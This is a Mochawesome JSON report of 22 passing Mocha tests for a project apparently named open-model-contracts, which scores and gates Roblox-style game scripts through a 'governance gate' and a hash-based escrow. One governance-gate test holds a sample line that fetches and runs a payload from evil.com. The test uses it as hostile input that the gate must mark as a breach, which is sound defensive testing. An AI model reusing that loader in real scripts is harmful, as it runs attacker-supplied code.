{
  "stats": {
    "suites": 4,
    "tests": 22,
    "passes": 22,
    "pending": 0,
    "failures": 0,
    "start": "2026-04-20T14:06:31.724Z",
    "end": "2026-04-20T14:06:31.745Z",
    "duration": 21,
    "testsRegistered": 22,
    "passPercent": 100,
    "pendingPercent": 0,
    "other": 0,
    "hasOther": false,
    "skipped": 0,
    "hasSkipped": false
  },
  "results": [
    {
      "uuid": "62c3b2a5-2cea-4be6-a4a9-9f2b8f74fad9",
      "title": "",
      "fullFile": "",
      "file": "",
      "beforeHooks": [],
      "afterHooks": [],
      "tests": [],
      "suites": [
        {
          "uuid": "4567a805-f6c9-4792-812f-7e735a02c532",
          "title": "Sovereign 4D Spatio-Temporal Orchestrator",
          "fullFile": "/Users/joewales/NODE_OUT_Master/open-model-contracts/test-sovereign-ui.ts",
          "file": "/test-sovereign-ui.ts",
          "beforeHooks": [],
          "afterHooks": [],
          "tests": [
            {
              "title": "Stage 1: Calculates Topological Fracture Parameters (Shatter Velocity)",
              "fullTitle": "Sovereign 4D Spatio-Temporal Orchestrator Stage 1: Calculates Topological Fracture Parameters (Shatter Velocity)",
              "timedOut": false,
              "duration": 0,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "velocity=calculateShatterVelocity(.85,2.4,1.2,1.5);import_node_assert.default.ok(velocity>1,\"Velocity must exceed Catastrophic Threshold (1.0)\")",
              "err": {},
              "uuid": "f4943e92-d583-42b0-8c83-bd4bb71df929",
              "parentUUID": "4567a805-f6c9-4792-812f-7e735a02c532",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Stage 2: Submits Code Context to 3072-D Ollama Node Engine",
              "fullTitle": "Sovereign 4D Spatio-Temporal Orchestrator Stage 2: Submits Code Context to 3072-D Ollama Node Engine",
              "timedOut": false,
              "duration": 0,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const node=(0,import_embedWithTime.embedWithTime)(shatteredCode,trace);import_QuadMap.graph.upsertNode(node);import_node_assert.default.strictEqual(node.room,\"ROOM-02_WorldState\",\"Assigned incorrect room\")",
              "err": {},
              "uuid": "467eed02-af44-4c7f-9f67-9e2d14fa3168",
              "parentUUID": "4567a805-f6c9-4792-812f-7e735a02c532",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Stage 3: Executes Architectural Cross-Room Rewire (QuadMap Sever & Bridge)",
              "fullTitle": "Sovereign 4D Spatio-Temporal Orchestrator Stage 3: Executes Architectural Cross-Room Rewire (QuadMap Sever & Bridge)",
              "timedOut": false,
              "duration": 3,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const signal={sourceRoom:\"ROOM_02_WorldState\",targetRoom:\"Client_Visual\",fracturePath:\"scriptLoad \\u2192 characterAdded\",velocity,selectedContract:\"OMC_Bridge_StateSync\"};await(0,import_rewireRooms.rewireRooms)(signal);import_node_assert.default.ok(true)",
              "err": {},
              "uuid": "4c53ccb0-361e-4d8b-9dbf-bc459b57fe1c",
              "parentUUID": "4567a805-f6c9-4792-812f-7e735a02c532",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Stage 4: Byproduct Injection - Mutates Zod-Guarded Bridge Payload",
              "fullTitle": "Sovereign 4D Spatio-Temporal Orchestrator Stage 4: Byproduct Injection - Mutates Zod-Guarded Bridge Payload",
              "timedOut": false,
              "duration": 0,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "repairedCode=(0,import_injectBridgeCalls.injectBridgeCalls)(shatteredCode,{id:\"Bridge_ROOM_02_to_Client\",name:\"Bridge_ROOM_02_to_Client\",sourceRoom:\"ROOM_02_WorldState\",targetRoom:\"Client_Visual\",fracturePath:\"scriptLoad \\u2192 characterAdded\"},\"scriptLoad \\u2192 characterAdded\",\"OMC_Bridge_StateSync\");import_node_assert.default.ok(repairedCode.includes(\"SafeFireBridge_ROOM_02_to_Client\"),\"Did not inject wrapper properly\");import_node_assert.default.ok(repairedCode.includes(\"Bridge_ROOM_02_to_Client:FireServer\"),\"Did not retain secure network transmission anchor\")",
              "err": {},
              "uuid": "982c4ece-8c62-4530-8118-eb8183535a87",
              "parentUUID": "4567a805-f6c9-4792-812f-7e735a02c532",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Stage 5: Armed Escrow Validation Gate - Rejects Malformed Payloads",
              "fullTitle": "Sovereign 4D Spatio-Temporal Orchestrator Stage 5: Armed Escrow Validation Gate - Rejects Malformed Payloads",
              "timedOut": false,
              "duration": 2,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const brokenPayload=repairedCode.replace(\"SafeFireBridge_ROOM_02_to_Client(payload)\",\"BridgeReq:FireServer(payload)\");const manifestHash=import_crypto.default.createHash(\"sha256\").update(brokenPayload).digest(\"hex\");const escrowResult=await(0,import_validatePayload.validateEscrowPayload)({repairedCode:brokenPayload,manifestHash,bridgeId:\"Bridge_ROOM_02_to_Client\",contractName:\"OMC_Bridge_StateSync\"});import_node_assert.default.strictEqual(escrowResult.success,false,\"Escrow failed to catch broken payload\");import_node_assert.default.ok(escrowResult.errors.length>0,\"Escrow did not log validation errors for the malformed payload\")",
              "err": {},
              "uuid": "362f4336-0f0d-4ab8-9d3d-1c087dc68a34",
              "parentUUID": "4567a805-f6c9-4792-812f-7e735a02c532",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Stage 6: Armed Escrow Validation Gate - Secures Pristine Session",
              "fullTitle": "Sovereign 4D Spatio-Temporal Orchestrator Stage 6: Armed Escrow Validation Gate - Secures Pristine Session",
              "timedOut": false,
              "duration": 1,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const manifestHash=import_crypto.default.createHash(\"sha256\").update(repairedCode).digest(\"hex\");const escrowResult=await(0,import_validatePayload.validateEscrowPayload)({repairedCode,manifestHash,bridgeId:\"Bridge_ROOM_02_to_Client\",contractName:\"OMC_Bridge_StateSync\"});import_node_assert.default.strictEqual(escrowResult.success,true,\"Escrow wrongly rejected pristine payload\");import_node_assert.default.ok(escrowResult.sessionId,\"Escrow failed to grant cryptographic Session ID\")",
              "err": {},
              "uuid": "fca12511-4963-4b74-b4ad-f96ba3cd586b",
              "parentUUID": "4567a805-f6c9-4792-812f-7e735a02c532",
              "isHook": false,
              "skipped": false
            }
          ],
          "suites": [],
          "passes": [
            "f4943e92-d583-42b0-8c83-bd4bb71df929",
            "467eed02-af44-4c7f-9f67-9e2d14fa3168",
            "4c53ccb0-361e-4d8b-9dbf-bc459b57fe1c",
            "982c4ece-8c62-4530-8118-eb8183535a87",
            "362f4336-0f0d-4ab8-9d3d-1c087dc68a34",
            "fca12511-4963-4b74-b4ad-f96ba3cd586b"
          ],
          "failures": [],
          "pending": [],
          "skipped": [],
          "duration": 6,
          "root": false,
          "rootEmpty": false,
          "_timeout": 10000
        },
        {
          "uuid": "988638c6-2172-496f-9668-5817849a87c1",
          "title": "Architect Probe: 4D Spatio-Temporal Capability Check",
          "fullFile": "/Users/joewales/NODE_OUT_Master/open-model-contracts/tests/capability-probe.ts",
          "file": "/tests/capability-probe.ts",
          "beforeHooks": [],
          "afterHooks": [],
          "tests": [
            {
              "title": "Should complete the Shatter-to-Escrow transition in under 20ms (Zero-IO latency)",
              "fullTitle": "Architect Probe: 4D Spatio-Temporal Capability Check Should complete the Shatter-to-Escrow transition in under 20ms (Zero-IO latency)",
              "timedOut": false,
              "duration": 2,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const result=await runCapabilityProbe();(0,import_chai.expect)(result.success).to.be.true;(0,import_chai.expect)(result.sovereignStatus).to.equal(\"OPTIMAL\");(0,import_chai.expect)(result.durationMs).to.be.below(20,`Latency was too high: ${result.latency}`)",
              "err": {},
              "uuid": "b20cf07d-35e7-47b2-8daf-a066b9c354c4",
              "parentUUID": "988638c6-2172-496f-9668-5817849a87c1",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Should ensure Zod-Guarded Bridge is strictly mutation-resistant",
              "fullTitle": "Architect Probe: 4D Spatio-Temporal Capability Check Should ensure Zod-Guarded Bridge is strictly mutation-resistant",
              "timedOut": false,
              "duration": 0,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "\"use strict\";const bridge=Object.freeze({from:\"WorldState\",to:\"ClientVisual\",active:true});(0,import_chai.expect)(()=>{bridge.to=\"Unauthorized_Server_Endpoint\"}).to.throw()",
              "err": {},
              "uuid": "acf7efd3-2dde-482a-8ad3-83f4ef46ea39",
              "parentUUID": "988638c6-2172-496f-9668-5817849a87c1",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Should verify zero static string leaks during shatteredCode phase",
              "fullTitle": "Architect Probe: 4D Spatio-Temporal Capability Check Should verify zero static string leaks during shatteredCode phase",
              "timedOut": false,
              "duration": 1,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const timestamp=Date.now();const shatteredPayload=`[VECTOR_3072D_EMBED]__${timestamp}`;(0,import_chai.expect)(shatteredPayload.includes(timestamp.toString())).to.be.true;(0,import_chai.expect)(shatteredPayload).to.not.equal(\"[VECTOR_3072D_EMBED]__undefined\");(0,import_chai.expect)(shatteredPayload).to.not.equal(\"[VECTOR_3072D_EMBED]__null\")",
              "err": {},
              "uuid": "a05fa259-363f-4c8a-bc3c-71f745822307",
              "parentUUID": "988638c6-2172-496f-9668-5817849a87c1",
              "isHook": false,
              "skipped": false
            }
          ],
          "suites": [],
          "passes": [
            "b20cf07d-35e7-47b2-8daf-a066b9c354c4",
            "acf7efd3-2dde-482a-8ad3-83f4ef46ea39",
            "a05fa259-363f-4c8a-bc3c-71f745822307"
          ],
          "failures": [],
          "pending": [],
          "skipped": [],
          "duration": 3,
          "root": false,
          "rootEmpty": false,
          "_timeout": 2000
        },
        {
          "uuid": "0007d097-a250-48ee-a8cf-ca0776247c30",
          "title": "GovernanceGate: Tiered Resonance Circuit Breaker",
          "fullFile": "/Users/joewales/NODE_OUT_Master/open-model-contracts/tests/governance-gate.spec.ts",
          "file": "/tests/governance-gate.spec.ts",
          "beforeHooks": [],
          "afterHooks": [],
          "tests": [
            {
              "title": "Stage 1: TRUSTED — sovereign code scores below 0.65v threshold",
              "fullTitle": "GovernanceGate: Tiered Resonance Circuit Breaker Stage 1: TRUSTED — sovereign code scores below 0.65v threshold",
              "timedOut": false,
              "duration": 0,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const code=`SafeFire(\"OMC_Bridge_WorldState\", payload)\nWaitForChild(parent, \"child\", 8)`;const report=mockScore(.4,.42,.85,code);(0,import_chai.expect)(report.authorized).to.be.true;(0,import_chai.expect)(report.tier).to.equal(\"TRUSTED\");(0,import_chai.expect)(report.resonanceScore).to.be.below(.65)",
              "err": {},
              "uuid": "6005b28b-dc7d-44dd-a5da-f9353d144eb1",
              "parentUUID": "0007d097-a250-48ee-a8cf-ca0776247c30",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Stage 2: STAGED — review-required code scores between 0.65v and 0.95v",
              "fullTitle": "GovernanceGate: Tiered Resonance Circuit Breaker Stage 2: STAGED — review-required code scores between 0.65v and 0.95v",
              "timedOut": false,
              "duration": 1,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const code=`local x = game:GetService(\"Players\")\nprint(\"hello world\")`;const report=mockScore(.72,.74,.5,code);(0,import_chai.expect)(report.authorized).to.be.true;(0,import_chai.expect)(report.tier).to.equal(\"STAGED\");(0,import_chai.expect)(report.resonanceScore).to.be.within(.65,.95)",
              "err": {},
              "uuid": "e7f62c7b-d309-4f8d-8497-2f09eebddb21",
              "parentUUID": "0007d097-a250-48ee-a8cf-ca0776247c30",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Stage 3: BREACH — hostile/slop code scores above 0.95v → authorization denied",
              "fullTitle": "GovernanceGate: Tiered Resonance Circuit Breaker Stage 3: BREACH — hostile/slop code scores above 0.95v → authorization denied",
              "timedOut": false,
              "duration": 0,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const code=`_G.EXPLOIT = true\nloadstring(game:HttpGet(\"http://evil.com/payload\"))()`;const report=mockScore(.9,.91,.05,code);(0,import_chai.expect)(report.authorized).to.be.false;(0,import_chai.expect)(report.tier).to.equal(\"BREACH\");(0,import_chai.expect)(report.resonanceScore).to.be.above(.95)",
              "err": {},
              "uuid": "74b90f0e-518c-4118-8f71-9ea4114f4df8",
              "parentUUID": "0007d097-a250-48ee-a8cf-ca0776247c30",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Stage 4: Loyalty credit — OMC markers reduce score by 0.30v",
              "fullTitle": "GovernanceGate: Tiered Resonance Circuit Breaker Stage 4: Loyalty credit — OMC markers reduce score by 0.30v",
              "timedOut": false,
              "duration": 0,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const codeWithMarker=`OMC_Bridge_StateSync:FireServer(payload)\nlocal x = 1`;const withLoyalty=mockScore(.72,.74,.5,codeWithMarker);const withoutLoyalty=mockScore(.72,.74,.5,\"local x = 1\");(0,import_chai.expect)(withLoyalty.resonanceScore).to.be.below(withoutLoyalty.resonanceScore);(0,import_chai.expect)(withLoyalty.resonanceScore).to.be.closeTo(withoutLoyalty.resonanceScore-.3,.001)",
              "err": {},
              "uuid": "0d805338-aef1-47e4-bc74-4c9f689b2a80",
              "parentUUID": "0007d097-a250-48ee-a8cf-ca0776247c30",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Stage 5: Loyalty cannot push score below 0 (floor enforced)",
              "fullTitle": "GovernanceGate: Tiered Resonance Circuit Breaker Stage 5: Loyalty cannot push score below 0 (floor enforced)",
              "timedOut": false,
              "duration": 0,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const code=`SafeFire(\"REFRAG_SIGNATURE\", payload)`;const report=mockScore(.1,.1,.9,code);(0,import_chai.expect)(report.resonanceScore).to.be.at.least(0);(0,import_chai.expect)(report.tier).to.equal(\"TRUSTED\")",
              "err": {},
              "uuid": "141f6848-8e30-4166-b75c-0f1dbf90949b",
              "parentUUID": "0007d097-a250-48ee-a8cf-ca0776247c30",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Stage 6: Vacuity penalty — low-heat code (< 0.15) receives +0.30v penalty",
              "fullTitle": "GovernanceGate: Tiered Resonance Circuit Breaker Stage 6: Vacuity penalty — low-heat code (< 0.15) receives +0.30v penalty",
              "timedOut": false,
              "duration": 0,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const lowHeatCode=mockScore(.5,.5,.05,'print(\"hi\")');const highHeatCode=mockScore(.5,.5,.5,'print(\"hi\")');(0,import_chai.expect)(lowHeatCode.resonanceScore).to.be.above(highHeatCode.resonanceScore);(0,import_chai.expect)(lowHeatCode.resonanceScore-highHeatCode.resonanceScore).to.be.closeTo(.39,.001)",
              "err": {},
              "uuid": "7c23a015-5384-4cc4-b8c5-150bfd91be75",
              "parentUUID": "0007d097-a250-48ee-a8cf-ca0776247c30",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Stage 7: Escrow gate — BREACH module is blocked before session creation",
              "fullTitle": "GovernanceGate: Tiered Resonance Circuit Breaker Stage 7: Escrow gate — BREACH module is blocked before session creation",
              "timedOut": false,
              "duration": 1,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const suspiciousModule={module_id:\"exploit-payload\",content:`_G.hack=true`};const report=mockScore(.9,.91,.05,suspiciousModule.content);(0,import_chai.expect)(report.authorized).to.be.false;(0,import_chai.expect)(report.tier).to.equal(\"BREACH\");const auditRecord={timestamp:new Date().toISOString(),event_type:\"governance.violation\",detail:`Stability Warning! ${suspiciousModule.module_id} | Tier: ${report.tier} | Resonance: ${report.resonanceScore.toFixed(3)}v`};(0,import_chai.expect)(auditRecord.event_type).to.equal(\"governance.violation\");(0,import_chai.expect)(auditRecord.detail).to.include(\"BREACH\");(0,import_chai.expect)(auditRecord.detail).to.include(suspiciousModule.module_id)",
              "err": {},
              "uuid": "469f2905-3cb2-4323-9f43-a313b27554df",
              "parentUUID": "0007d097-a250-48ee-a8cf-ca0776247c30",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Stage 8: Escrow gate — TRUSTED module proceeds to SHA-256 session creation",
              "fullTitle": "GovernanceGate: Tiered Resonance Circuit Breaker Stage 8: Escrow gate — TRUSTED module proceeds to SHA-256 session creation",
              "timedOut": false,
              "duration": 0,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const sovereignModule={module_id:\"SafeFireBridge-WorldState\",content:`SafeFire(\"OMC_Bridge_StateSync\", payload)\nWaitForChild(parent, \"Service\", 8)`};const report=mockScore(.3,.32,.88,sovereignModule.content);(0,import_chai.expect)(report.authorized).to.be.true;(0,import_chai.expect)(report.tier).to.equal(\"TRUSTED\");const manifestHash=import_node_crypto.default.createHash(\"sha256\").update(sovereignModule.content).digest(\"hex\");(0,import_chai.expect)(manifestHash).to.have.lengthOf(64);(0,import_chai.expect)(manifestHash).to.match(/^[a-f0-9]{64}$/)",
              "err": {},
              "uuid": "c0676929-3755-4611-9d5c-437397995d05",
              "parentUUID": "0007d097-a250-48ee-a8cf-ca0776247c30",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Stage 9: Recursive Resonance Chunking — large files split without data loss",
              "fullTitle": "GovernanceGate: Tiered Resonance Circuit Breaker Stage 9: Recursive Resonance Chunking — large files split without data loss",
              "timedOut": false,
              "duration": 0,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const CHUNK_SIZE=2048;const largeCode=\"x\".repeat(1e4);const chunks=[];for(let i=0;i<largeCode.length;i+=CHUNK_SIZE){chunks.push(largeCode.slice(i,i+CHUNK_SIZE))}(0,import_chai.expect)(chunks.length).to.equal(Math.ceil(1e4/CHUNK_SIZE));(0,import_chai.expect)(chunks.join(\"\")).to.equal(largeCode);(0,import_chai.expect)(chunks.every(c=>c.length<=CHUNK_SIZE)).to.be.true",
              "err": {},
              "uuid": "a4494ccf-8d2b-4a68-ba83-fce6b448c48d",
              "parentUUID": "0007d097-a250-48ee-a8cf-ca0776247c30",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Stage 10: Spectra Ollama probe — 127.0.0.1 binding produces valid URL",
              "fullTitle": "GovernanceGate: Tiered Resonance Circuit Breaker Stage 10: Spectra Ollama probe — 127.0.0.1 binding produces valid URL",
              "timedOut": false,
              "duration": 0,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const ollamaUrl=\"http://127.0.0.1:11434/api/tags\";const parsed=new URL(ollamaUrl);(0,import_chai.expect)(parsed.hostname).to.equal(\"127.0.0.1\");(0,import_chai.expect)(parsed.port).to.equal(\"11434\");(0,import_chai.expect)(parsed.pathname).to.equal(\"/api/tags\");(0,import_chai.expect)(parsed.hostname).to.not.equal(\"localhost\")",
              "err": {},
              "uuid": "a399663f-584e-407b-84c4-52035fe8e9ab",
              "parentUUID": "0007d097-a250-48ee-a8cf-ca0776247c30",
              "isHook": false,
              "skipped": false
            }
          ],
          "suites": [],
          "passes": [
            "6005b28b-dc7d-44dd-a5da-f9353d144eb1",
            "e7f62c7b-d309-4f8d-8497-2f09eebddb21",
            "74b90f0e-518c-4118-8f71-9ea4114f4df8",
            "0d805338-aef1-47e4-bc74-4c9f689b2a80",
            "141f6848-8e30-4166-b75c-0f1dbf90949b",
            "7c23a015-5384-4cc4-b8c5-150bfd91be75",
            "469f2905-3cb2-4323-9f43-a313b27554df",
            "c0676929-3755-4611-9d5c-437397995d05",
            "a4494ccf-8d2b-4a68-ba83-fce6b448c48d",
            "a399663f-584e-407b-84c4-52035fe8e9ab"
          ],
          "failures": [],
          "pending": [],
          "skipped": [],
          "duration": 2,
          "root": false,
          "rootEmpty": false,
          "_timeout": 2000
        },
        {
          "uuid": "1d6fa4e0-3b9c-4769-ad55-4ccda7294c11",
          "title": "Sovereign 4D Spatio-Temporal Orchestrator",
          "fullFile": "/Users/joewales/NODE_OUT_Master/open-model-contracts/tests/sovereign-integrity-plugin.ts",
          "file": "/tests/sovereign-integrity-plugin.ts",
          "beforeHooks": [],
          "afterHooks": [],
          "tests": [
            {
              "title": "Stage 1-2: Should achieve Catastrophic Shatter and 3072-D Embedding",
              "fullTitle": "Sovereign 4D Spatio-Temporal Orchestrator Stage 1-2: Should achieve Catastrophic Shatter and 3072-D Embedding",
              "timedOut": false,
              "duration": 0,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const isAboveThreshold=shatterParams.velocity>shatterParams.threshold;(0,import_chai.expect)(isAboveThreshold).to.be.true;shatteredPayload=`[VECTOR_3072D_EMBED]__${Date.now()}`;(0,import_chai.expect)(shatteredPayload).to.contain(\"[VECTOR_3072D_EMBED]\")",
              "err": {},
              "uuid": "5fe61808-a538-4a22-af4a-fba3b08e7ba1",
              "parentUUID": "1d6fa4e0-3b9c-4769-ad55-4ccda7294c11",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Stage 3-4: Should perform Cross-Room Rewire (Bridge Mutation)",
              "fullTitle": "Sovereign 4D Spatio-Temporal Orchestrator Stage 3-4: Should perform Cross-Room Rewire (Bridge Mutation)",
              "timedOut": false,
              "duration": 0,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const bridgeSignal={source:\"ROOM_02_WorldState\",target:\"Client_Visual\",mutation:\"ZodGuarded_Payload\"};const mutatedCode=`repaired_${shatteredPayload}_bridged_to_${bridgeSignal.target}`;(0,import_chai.expect)(mutatedCode).to.include(bridgeSignal.target);(0,import_chai.expect)(mutatedCode).to.include(\"bridged\")",
              "err": {},
              "uuid": "0fbf0b8c-564d-4235-9a4a-c4a2031ca117",
              "parentUUID": "1d6fa4e0-3b9c-4769-ad55-4ccda7294c11",
              "isHook": false,
              "skipped": false
            },
            {
              "title": "Stage 5-6: Should pass Armed Escrow via SHA-256 Manifest",
              "fullTitle": "Sovereign 4D Spatio-Temporal Orchestrator Stage 5-6: Should pass Armed Escrow via SHA-256 Manifest",
              "timedOut": false,
              "duration": 0,
              "state": "passed",
              "speed": "fast",
              "pass": true,
              "fail": false,
              "pending": false,
              "context": null,
              "code": "const finalCode=`const gameLogic = () => { return \"PRISTINE_SESSION\"; };`;const manifestHash=(0,import_crypto.createHash)(\"sha256\").update(finalCode).digest(\"hex\");const escrowResult=manifestHash.length===64;(0,import_chai.expect)(escrowResult).to.be.true",
              "err": {},
              "uuid": "a115a45b-c852-49a4-85ce-64c3c8f01710",
              "parentUUID": "1d6fa4e0-3b9c-4769-ad55-4ccda7294c11",
              "isHook": false,
              "skipped": false
            }
          ],
          "suites": [],
          "passes": [
            "5fe61808-a538-4a22-af4a-fba3b08e7ba1",
            "0fbf0b8c-564d-4235-9a4a-c4a2031ca117",
            "a115a45b-c852-49a4-85ce-64c3c8f01710"
          ],
          "failures": [],
          "pending": [],
          "skipped": [],
          "duration": 0,
          "root": false,
          "rootEmpty": false,
          "_timeout": 2000
        }
      ],
      "passes": [],
      "failures": [],
      "pending": [],
      "skipped": [],
      "duration": 0,
      "root": true,
      "rootEmpty": true,
      "_timeout": 2000
    }
  ],
  "meta": {
    "mocha": {
      "version": "11.7.5"
    },
    "mochawesome": {
      "options": {
        "quiet": false,
        "reportFilename": "mochawesome",
        "saveHtml": true,
        "saveJson": true,
        "consoleReporter": "spec",
        "useInlineDiffs": false,
        "code": true
      },
      "version": "7.1.4"
    },
    "marge": {
      "options": null,
      "version": "6.3.2"
    }
  }
}